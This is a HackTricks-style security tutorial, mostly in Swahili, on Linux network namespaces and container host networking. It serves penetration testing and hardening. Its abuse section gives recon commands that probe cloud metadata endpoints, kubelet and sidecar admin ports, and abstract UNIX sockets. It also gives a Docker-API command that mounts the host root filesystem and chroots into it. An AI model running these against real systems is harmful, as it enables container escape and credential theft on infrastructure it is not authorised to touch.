# Namespace ya Mtandao

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

The network namespace hutenga rasilimali zinazohusiana na mtandao kama vile interfaces, IP addresses, routing tables, hali ya ARP/neighbor, firewall rules, sockets, UNIX-domain abstract socket namespace, na yaliyomo katika files kama `/proc/net`. Hii ndiyo sababu container inaweza kuwa na `eth0` yake inayoonekana kama ya kwake, routes zake za ndani, na loopback device yake bila kumiliki network stack halisi ya host.

Kwa upande wa usalama, hili ni muhimu kwa sababu network isolation inahusu mengi zaidi kuliko port binding. Private network namespace hupunguza kile ambacho workload inaweza kuchunguza au kusanidi upya moja kwa moja. Mara namespace hiyo inaposhirikiwa na host, container inaweza ghafla kupata mwonekano wa host listeners, host-local services, abstract AF_UNIX endpoints, na network control points ambazo hazikukusudiwa kufichuliwa kwa application.

## Uendeshaji

Network namespace mpya iliyoundwa huanza ikiwa na network environment tupu au karibu tupu hadi interfaces ziunganishwe nayo. Container runtimes kisha huunda au kuunganisha virtual interfaces, huweka addresses, na husanidi routes ili workload ipate connectivity inayotarajiwa. Katika deployments zinazotumia bridge, kwa kawaida hii humaanisha kuwa container huona interface inayotegemea veth na iliyounganishwa na host bridge. Katika Kubernetes, CNI plugins hushughulikia setup inayolingana kwa ajili ya Pod networking.

Architecture hii inaeleza kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa sana. Badala ya kupokea private network stack iliyoandaliwa, workload hujiunga na network stack halisi ya host.

## Lab

Unaweza kuona network namespace iliyo karibu tupu kwa kutumia:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na host-networked kwa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Container yenye host-networking haina tena mwonekano wake binafsi wa socket na interface uliotengwa. Mabadiliko hayo pekee tayari ni makubwa kabla hata hujauliza process ina capabilities zipi.

## Matumizi ya Runtime

Docker na Podman kwa kawaida huunda network namespace binafsi kwa kila container isipokuwa zisanidiwe vinginevyo. Kubernetes kwa kawaida huipa kila Pod network namespace yake, inayoshirikiwa na containers zilizo ndani ya Pod hiyo lakini ikiwa imetenganishwa na host. Hii inamaanisha kuwa `127.0.0.1` kwa kawaida ni ya Pod nzima badala ya container moja: listener iliyofungwa kwenye localhost pekee ndani ya container moja kwa kawaida inaweza kufikiwa na sidecars na containers nyingine zilizo ndani ya Pod hiyo. Mifumo ya Incus/LXC pia hutoa isolation yenye uwezo mkubwa inayotegemea network namespace, mara nyingi ikiwa na aina mbalimbali zaidi za usanidi wa virtual networking.

Kanuni ya kawaida ni kwamba private networking ndiyo isolation boundary ya kawaida, huku host networking ikiwa ni chaguo la wazi la kujiondoa kwenye boundary hiyo.

## Mipangilio Isiyo Sahihi

Mpasuko muhimu zaidi wa usanidi ni kushiriki host network namespace. Wakati mwingine hufanywa kwa ajili ya performance, low-level monitoring, au urahisi, lakini huondoa mojawapo ya boundaries salama zaidi zinazopatikana kwa containers. Listeners za host-local huwa zinaweza kufikiwa kwa njia ya moja kwa moja zaidi, services zinazopatikana kupitia localhost pekee zinaweza kufikika, na capabilities kama `CAP_NET_ADMIN` au `CAP_NET_RAW` huwa hatari zaidi kwa sababu operations zinazoruhusiwa na capabilities hizo sasa zinatumika kwenye mazingira halisi ya network ya host.

Tatizo lingine ni kugawa capabilities nyingi za network hata wakati network namespace ni binafsi. Namespace binafsi husaidia, lakini haifanyi raw sockets au advanced network control kuwa salama bila masharti.

Katika Kubernetes, `hostNetwork: true` pia hubadilisha kiwango cha imani unachoweza kuweka kwenye network segmentation ya kiwango cha Pod. Kubernetes inaeleza kwamba network plugins nyingi haziwezi kutofautisha ipasavyo traffic ya Pod yenye `hostNetwork` wakati wa kulinganisha `podSelector` / `namespaceSelector`, na kwa hiyo huichukulia kama traffic ya kawaida ya node. Kwa mtazamo wa attacker, hii inamaanisha workload iliyoathiriwa yenye `hostNetwork` mara nyingi inapaswa kuchukuliwa kama foothold ya kiwango cha node badala ya Pod ya kawaida ambayo bado imezuiwa na assumptions zilezile za policy kama workloads zinazotumia overlay network.

## Matumizi Mabaya

Katika setups zenye isolation dhaifu, attackers wanaweza kukagua services zinazolisten kwenye host, kufikia management endpoints zilizofungwa kwenye loopback pekee, kunusa au kuingilia traffic kulingana na capabilities na mazingira halisi, au kusanidi upya routing na firewall state ikiwa `CAP_NET_ADMIN` ipo. Kwenye cluster, hii pia inaweza kurahisisha lateral movement na reconnaissance ya control plane.

Ikiwa unashuku host networking, anza kwa kuthibitisha kwamba interfaces na listeners zinazoonekana ni za host badala ya kuwa za isolated container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Huduma za loopback pekee mara nyingi huwa ugunduzi wa kwanza wa kuvutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets ni shabaha nyingine ambayo ni rahisi kupuuzwa kwa sababu ziko scoped kwa network namespace, ingawa hazionekani kama TCP/UDP listeners na huenda zisiwepo kama filesystem paths chini ya `/run`. Kwa hiyo, container yenye host network inaweza kurithi ufikiaji wa control channels za host pekee ambazo hazikuwahi bind-mountiwa ndani ya container hata kidogo:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Mfano wa kihistoria ulikuwa bug ya kufichuliwa kwa abstract socket ya `containerd-shim`, lakini somo pana ni muhimu zaidi kuliko CVE mahususi: mara workload inapojiunga na network namespace ya host, huduma za abstract AF_UNIX pia huwa sehemu ya attack surface. Ikiwa socket hizo zinaonekana kuwa zinazohusiana na runtime au za kiutawala, pivot kwenda [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Ikiwa network capabilities zipo, test ikiwa workload inaweza kukagua au kubadilisha stack inayoonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Kwenye kernels za kisasa, host networking pamoja na `CAP_NET_ADMIN` vinaweza pia kufichua njia ya pakiti zaidi ya mabadiliko rahisi ya `iptables` / `nftables`. `tc` qdiscs na filters pia zimewekewa mipaka kwa namespace, hivyo katika host network namespace iliyoshirikiwa hutumika kwenye interfaces za host ambazo container inaweza kuona. Ikiwa `CAP_BPF` pia ipo, eBPF programs zinazohusiana na mtandao kama loaders za TC na XDP huwa muhimu pia:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Hili ni muhimu kwa sababu attacker anaweza ku-mirror, ku-redirect, ku-shape, au ku-drop traffic katika kiwango cha host interface, si kubadilisha tu firewall rules. Katika private network namespace, vitendo hivyo hubaki kwenye mwonekano wa container; katika shared host namespace, vinaathiri host.

Katika cluster au cloud environments, host networking pia huhalalisha local recon ya haraka ya metadata na services zilizo karibu na control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Katika Kubernetes, kumbuka kwamba ku-compromise **container** yoyote katika Pod yenye containers nyingi pia kunatoa ufikiaji wa localhost listeners zilizofunguliwa na containers wenza na sidecars, kwa sababu Pod nzima hushiriki network namespace moja. Hili huwa muhimu hasa kwa service-mesh, observability, na helper containers ambazo interfaces zao za usimamizi au debug zimekusudiwa kuwa Pod-internal badala ya cluster-wide:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Chukulia "bound to localhost" kama **Pod-private**, si **container-private**. Baada ya container moja ndani ya Pod kuathirika, dhana hiyo haipo tena.

### Mfano Kamili: Host Networking + Ufikiaji wa Local Runtime / Kubelet

Host networking haitoi host root moja kwa moja, lakini mara nyingi hufichua services ambazo zimekusudiwa kufikiwa tu kutoka kwenye node yenyewe. Ikiwa mojawapo ya services hizo imelindwa kwa udhaifu, host networking huwa njia ya moja kwa moja ya privilege-escalation.

Docker API kwenye localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- direct host compromise ikiwa runtime API ya ndani imewekwa wazi bila ulinzi unaofaa
- cluster reconnaissance au lateral movement ikiwa kubelet au local agents zinaweza kufikiwa
- traffic manipulation au denial of service zinapotumiwa pamoja na `CAP_NET_ADMIN`

## Checks

Lengo la checks hizi ni kubaini ikiwa process ina private network stack, ni routes na listeners zipi zinaonekana, na ikiwa network view tayari inaonekana kama ya host kabla hata hujajaribu capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Kinachovutia hapa:

- Ikiwa `/proc/self/ns/net` na `/proc/1/ns/net` tayari vinaonekana kama vya host, container inaweza kuwa inashiriki network namespace ya host au namespace nyingine isiyo ya faragha.
- `lsns -t net` na `ip netns identify` ni muhimu wakati shell tayari iko ndani ya namespace iliyopewa jina au persistent namespace, na unataka kuihusisha na objects za `/run/netns` kutoka upande wa host.
- `ss -lntup` ni muhimu sana kwa sababu inaonyesha listeners za loopback-only na endpoints za local management. `ss -xap` na `/proc/net/unix` huongeza mtazamo wa abstract-socket ambao uchunguzi wa kawaida wa sockets za filesystem hauwezi kuonyesha.
- Routes, majina ya interfaces, muktadha wa firewall, hali ya `tc`, na eBPF attachments huwa muhimu zaidi ikiwa `CAP_NET_ADMIN`, `CAP_NET_RAW`, au `CAP_BPF` ipo.
- Katika Kubernetes, kushindwa kwa service-name resolution kutoka kwenye Pod yenye `hostNetwork` kunaweza kumaanisha tu kwamba Pod haitumii `dnsPolicy: ClusterFirstWithHostNet`, wala si kwamba service haipo.
- Katika Pods zenye containers nyingi, listeners za localhost ni za Pod network namespace nzima, kwa hivyo kagua sidecars na sibling containers kabla ya kudhani kwamba port ya loopback-only haiwezi kufikiwa kutoka kwenye container iliyoathirika.

Unapokagua container, tathmini kila mara network namespace pamoja na capability set. Host networking pamoja na network capabilities zenye nguvu ni posture tofauti kabisa na bridge networking pamoja na default capability set finyu.

## Marejeo

- [Kubernetes NetworkPolicy na tahadhari za `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` za Linux na isolation ya abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Ushauri wa containerd: abstract Unix domain sockets zilizofichuliwa kwa containers zinazotumia host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Mahitaji ya eBPF token na capability kwa network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
